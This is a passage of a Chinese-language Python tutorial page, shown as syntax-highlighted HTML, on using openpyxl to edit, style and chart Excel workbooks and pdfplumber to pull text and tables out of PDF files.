class="token punctuation">:</span>    sheet<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">)</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="插入公式"><a href="#插入公式" class="headerlink" title="插入公式"></a>插入公式</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>utils <span class="token keyword">import</span> FORMULAEworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">[</span><span class="token string">'B7'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">'=AVERAGE(B1:B6)'</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>FORMULAE<span class="token punctuation">)</span>                 <span class="token comment">#查看openpyxl支持的公式</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="插入和删除一列、多列、一行、多行"><a href="#插入和删除一列、多列、一行、多行" class="headerlink" title="插入和删除一列、多列、一行、多行"></a>插入和删除一列、多列、一行、多行</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>insert_cols<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token comment">#在idx列左边插入一列空的列</span>sheet<span class="token punctuation">.</span>insert_cols<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">,</span>amount<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>       <span class="token comment">#在idx列左边插入2列空的列</span>sheet<span class="token punctuation">.</span>insert_rows<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token comment">#在idx行上边插入一行空的行</span>sheet<span class="token punctuation">.</span>insert_rows<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>amount<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>       <span class="token comment">#在idx行上边插入2行空的行</span>sheet<span class="token punctuation">.</span>delete_cols<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token comment">#删除idx列    </span>sheet<span class="token punctuation">.</span>delete_cols<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>amount<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>       <span class="token comment">#删除从idx列开始，向右共2列</span>sheet<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>                <span class="token comment">#删除idx行    </span>sheet<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>amount<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>       <span class="token comment">#删除从idx行开始，向下共2行</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="移动格子"><a href="#移动格子" class="headerlink" title="移动格子"></a>移动格子</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>move_range<span class="token punctuation">(</span><span class="token string">"A1:B2"</span><span class="token punctuation">,</span>rows<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>cols<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>        <span class="token comment">#正整数为向下或向右，负整数为向左或向上</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建、删除、复制、改名sheet"><a href="#创建、删除、复制、改名sheet" class="headerlink" title="创建、删除、复制、改名sheet"></a>创建、删除、复制、改名sheet</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>workbook<span class="token punctuation">.</span>create_sheet<span class="token punctuation">(</span><span class="token string">'sheet2'</span><span class="token punctuation">)</span>         <span class="token comment">#创建</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'sheet2'</span><span class="token punctuation">]</span>workbook<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>sheet<span class="token punctuation">)</span>                  <span class="token comment">#删除</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'Sheet1'</span><span class="token punctuation">]</span>workbook<span class="token punctuation">.</span>copy_worksheet<span class="token punctuation">(</span>sheet<span class="token punctuation">)</span>          <span class="token comment">#复制</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>             sheet<span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">'cool-sheet'</span>                <span class="token comment">#修改名称</span><span class="token keyword">print</span><span class="token punctuation">(</span>workbook<span class="token punctuation">.</span>sheetnames<span class="token punctuation">)</span>          workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="创建新的Excel表格文件"><a href="#创建新的Excel表格文件" class="headerlink" title="创建新的Excel表格文件"></a>创建新的Excel表格文件</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> Workbookworkbook<span class="token operator">=</span>Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">'firstsheet'</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'newfile.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="冻结窗格"><a href="#冻结窗格" class="headerlink" title="冻结窗格"></a>冻结窗格</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">import</span> randomworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activesheet<span class="token punctuation">.</span>freeze_panes<span class="token operator">=</span><span class="token string">'B2'</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="添加筛选"><a href="#添加筛选" class="headerlink" title="添加筛选"></a>添加筛选</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'cool-sheet'</span><span class="token punctuation">]</span>sheet<span class="token punctuation">.</span>auto_filter<span class="token punctuation">.</span>ref<span class="token operator">=</span>sheet<span class="token punctuation">.</span>dimensionsworkbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="关于样式"><a href="#关于样式" class="headerlink" title="关于样式"></a>关于样式</h3><h4 id="修改字体样式"><a href="#修改字体样式" class="headerlink" title="修改字体样式"></a>修改字体样式</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>styles <span class="token keyword">import</span> Fontworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activecell<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A2'</span><span class="token punctuation">]</span>font<span class="token operator">=</span>Font<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'华文琥珀'</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">,</span>bold<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>italic<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'FF0000'</span><span class="token punctuation">)</span>cell<span class="token punctuation">.</span>font<span class="token operator">=</span>font<span class="token keyword">print</span><span class="token punctuation">(</span>font<span class="token punctuation">.</span>name<span class="token punctuation">,</span>font<span class="token punctuation">.</span>size<span class="token punctuation">,</span>font<span class="token punctuation">.</span>bold<span class="token punctuation">,</span>font<span class="token punctuation">.</span>italic<span class="token punctuation">)</span>                           <span class="token comment">#获取字体信息</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置对齐样式"><a href="#设置对齐样式" class="headerlink" title="设置对齐样式"></a>设置对齐样式</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>styles <span class="token keyword">import</span> Alignmentworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activecell<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A3'</span><span class="token punctuation">]</span>alignment<span class="token operator">=</span>Alignment<span class="token punctuation">(</span>horizontal<span class="token operator">=</span><span class="token string">'center'</span><span class="token punctuation">,</span>vertical<span class="token operator">=</span><span class="token string">'center'</span><span class="token punctuation">,</span>text_rotation<span class="token operator">=</span><span class="token number">45</span><span class="token punctuation">,</span>wrap_text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token comment">#horizontal=水平对齐模式 vertical=垂直对齐模式 text_rotation=旋转角度 wrap_text=是否自动换行</span>cell<span class="token punctuation">.</span>alignment<span class="token operator">=</span>alignmentworkbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>水平对齐:’distributed’,’justify’,’center’,’left’,’fill’,’centerContinuous’,’right’,’general’<br>垂直对齐:’bottom’,’distributed’,’justify’,’center’,’top’</p></blockquote><h4 id="设置边框样式"><a href="#设置边框样式" class="headerlink" title="设置边框样式"></a>设置边框样式</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>styles <span class="token keyword">import</span> Side<span class="token punctuation">,</span>Borderworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>activecell<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A3'</span><span class="token punctuation">]</span>side1<span class="token operator">=</span>Side<span class="token punctuation">(</span>style<span class="token operator">=</span><span class="token string">'thin'</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'FF000000'</span><span class="token punctuation">)</span>       <span class="token comment">#style=边线样式,color=边线颜色</span>side2<span class="token operator">=</span>Side<span class="token punctuation">(</span>style<span class="token operator">=</span><span class="token string">'dotted'</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'FFFF0000'</span><span class="token punctuation">)</span>  border<span class="token operator">=</span>Border<span class="token punctuation">(</span>left<span class="token operator">=</span>side1<span class="token punctuation">,</span>right<span class="token operator">=</span>side2<span class="token punctuation">,</span>top<span class="token operator">=</span>side2<span class="token punctuation">,</span>bottom<span class="token operator">=</span>side1<span class="token punctuation">)</span>cell<span class="token punctuation">.</span>border<span class="token operator">=</span>borderworkbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置填充样式"><a href="#设置填充样式" class="headerlink" title="设置填充样式"></a>设置填充样式</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>styles <span class="token keyword">import</span> PatternFill<span class="token punctuation">,</span>GradientFillworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'cool-sheet'</span><span class="token punctuation">]</span>cell_a6<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A6'</span><span class="token punctuation">]</span>pattern_fill<span class="token operator">=</span>PatternFill<span class="token punctuation">(</span>fill_type<span class="token operator">=</span><span class="token string">'solid'</span><span class="token punctuation">,</span>fgColor<span class="token operator">=</span><span class="token string">'99ccff'</span><span class="token punctuation">)</span>   <span class="token comment">#fill_type=填充样式，fgColor=填充颜色</span>cell_a6<span class="token punctuation">.</span>fill<span class="token operator">=</span>pattern_fillcell_a7<span class="token operator">=</span>sheet<span class="token punctuation">[</span><span class="token string">'A7'</span><span class="token punctuation">]</span>gradient_fill<span class="token operator">=</span>GradientFill<span class="token punctuation">(</span>stop<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'FFFFFF'</span><span class="token punctuation">,</span><span class="token string">'99CCFF'</span><span class="token punctuation">,</span><span class="token string">'000000'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment">#stop=(渐变颜色1，渐变颜色2...)</span>cell_a7<span class="token punctuation">.</span>fill<span class="token operator">=</span>gradient_fillworkbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置行高和列宽"><a href="#设置行高和列宽" class="headerlink" title="设置行高和列宽"></a>设置行高和列宽</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'cool-sheet'</span><span class="token punctuation">]</span>sheet<span class="token punctuation">.</span>row_dimensions<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">50</span>sheet<span class="token punctuation">.</span>column_dimensions<span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">20</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="合并和取消合并单元格"><a href="#合并和取消合并单元格" class="headerlink" title="合并和取消合并单元格"></a>合并和取消合并单元格</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbookworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'cool-sheet'</span><span class="token punctuation">]</span>sheet<span class="token punctuation">.</span>merge_cells<span class="token punctuation">(</span><span class="token string">'C1:D2'</span><span class="token punctuation">)</span>          <span class="token comment">#方法一</span>sheet<span class="token punctuation">.</span>merge_cells<span class="token punctuation">(</span>start_row<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>start_column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>end_row<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>end_column<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment">#方法二</span>sheet<span class="token punctuation">.</span>unmerge_cells<span class="token punctuation">(</span><span class="token string">'C1:D2'</span><span class="token punctuation">)</span>          <span class="token comment">#方法一</span>sheet<span class="token punctuation">.</span>unmerge_cells<span class="token punctuation">(</span>start_row<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">,</span>start_column<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>end_row<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">,</span>end_column<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment">#方法二</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="生成图表"><a href="#生成图表" class="headerlink" title="生成图表"></a>生成图表</h3><h4 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>drawing<span class="token punctuation">.</span>image <span class="token keyword">import</span> Imageworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'cool-sheet'</span><span class="token punctuation">]</span>logo<span class="token operator">=</span>Image<span class="token punctuation">(</span><span class="token string">"landscape.jpg"</span><span class="token punctuation">)</span>logo<span class="token punctuation">.</span>height<span class="token operator">=</span><span class="token number">100</span>logo<span class="token punctuation">.</span>width<span class="token operator">=</span><span class="token number">100</span>sheet<span class="token punctuation">.</span>add_image<span class="token punctuation">(</span>logo<span class="token punctuation">,</span><span class="token string">"C1"</span><span class="token punctuation">)</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="插入条形图"><a href="#插入条形图" class="headerlink" title="插入条形图"></a>插入条形图</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> load_workbook<span class="token keyword">from</span> openpyxl<span class="token punctuation">.</span>chart <span class="token keyword">import</span> LineChart<span class="token punctuation">,</span>Referenceworkbook<span class="token operator">=</span>load_workbook<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span>sheet<span class="token operator">=</span>workbook<span class="token punctuation">[</span><span class="token string">'sheet1'</span><span class="token punctuation">]</span>chart<span class="token operator">=</span>LineChart<span class="token punctuation">(</span><span class="token punctuation">)</span>data<span class="token operator">=</span>Reference<span class="token punctuation">(</span>worksheet<span class="token operator">=</span>sheet<span class="token punctuation">,</span>min_row<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>max_row<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span>min_col<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>max_col<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">)</span>categories<span class="token operator">=</span>Reference<span class="token punctuation">(</span>sheet<span class="token punctuation">,</span>min_row<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>min_col<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>max_col<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">)</span>chart<span class="token punctuation">.</span>add_data<span class="token punctuation">(</span>data<span class="token punctuation">,</span>from_rows<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>titles_from_data<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>chart<span class="token punctuation">.</span>set_categories<span class="token punctuation">(</span>categories<span class="token punctuation">)</span>sheet<span class="token punctuation">.</span>add_chart<span class="token punctuation">(</span>chart<span class="token punctuation">,</span><span class="token string">"B5"</span><span class="token punctuation">)</span>workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'example.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/images_of_blog/python-auto-f1.png"></p><blockquote><p>柱状图同理，BarChart()</p></blockquote><h2 id="处理PDF文件"><a href="#处理PDF文件" class="headerlink" title="处理PDF文件"></a>处理PDF文件</h2><h3 id="提取文字、表格"><a href="#提取文字、表格" class="headerlink" title="提取文字、表格"></a>提取文字、表格</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pdfplumber<span class="token keyword">with</span> pdfplumber<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pdf"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pdf<span class="token punctuation">:</span>    <span class="token keyword">for</span> page <span class="token keyword">in</span> pdf<span class="token punctuation">.</span>pages<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>page<span class="token punctuation">.</span>extract_text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>表格为extract_tables()</p></blockquote><p>提取表格时还可以设置一些参数</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pdfplumber<span class="token keyword">with</span> pdfplumber<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pdf"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pdf<span class="token punctuation">:</span>    table_page<span class="token operator">=</span>pdf<span class="token punctuation">.</span>pages<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    table<span class="token operator">=</span>table_page<span class="token punctuation">.</span>extract_table<span class="token punctuation">(</span>        table_settings<span class="token operator">=</span><span class="token punctuation">&#123;</span>             <span class="token string">"vertical_strategy"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span>            <span class="token string">"horizontal_strategy"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>table<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="提取的表格写入excel"><a href="#提取的表格写入excel" class="headerlink" title="提取的表格写入excel"></a>提取的表格写入excel</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pdfplumber<span class="token keyword">from</span> openpyxl <span class="token keyword">import</span> Workbook<span class="token keyword">with</span> pdfplumber<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1.pdf"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> pdf<span class="token punctuation">:</span>    table_page<span class="token operator">=</span>pdf<span class="token punctuation">.</span>pages<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    table<span class="token operator">=</span>table_page<span class="token punctuation">.</span>extract_table<span class="token punctuation">(</span>        table_settings<span class="token operator">=</span><span class="token punctuation">&#123;</span>            <span class="token string">"vertical_strategy"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span>            <span class="token string">"horizontal_strategy"</span><span class="token punctuation">:</span><span class="token string">"text"</span><span class="token punctuation">,</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">)</span>    workbook<span class="token operator">=</span>Workbook<span class="token punctuation">(</span><span class="token punctuation">)</span>    sheet<span class="token operator">=</span>workbook<span class="token punctuation">.</span>active    <span class="token keyword">for</span> row <span class="token keyword">in</span> table<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token keyword">for</span> item <span class="token keyword">in</span> row<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">''</span><span class="token punctuation">:</span>  <span class="token comment">#将列表中的每个元素都以字符串方式连接起来,起到去除空行的作用</span>            sheet<span class="token punctuation">.</span>append<span class="token punctuation">(</span>row<span class="token punctuation">)</span>    workbook<span class="token punctuation">.</span>save<span class="token punctuation">(</span>filename<span class="token operator">=</span><span class="token string">'1.xlsx'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>[str(item) for item in row] 快速生成一个列表</p></blockquote><h3 id="合并前几列单词"><a href="#合并前几列单词" class="headerlink" title="合并前几列单词"></a>合并前几列单词</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">new_row<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>new_row<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token keyword">if</span> item <span class="token keyword">else</span> <span class="token string">''</span> <span class="token keyword">for</span> item <span class="token keyword">in</span> row<span class="token punctuation">[</span><span class="token 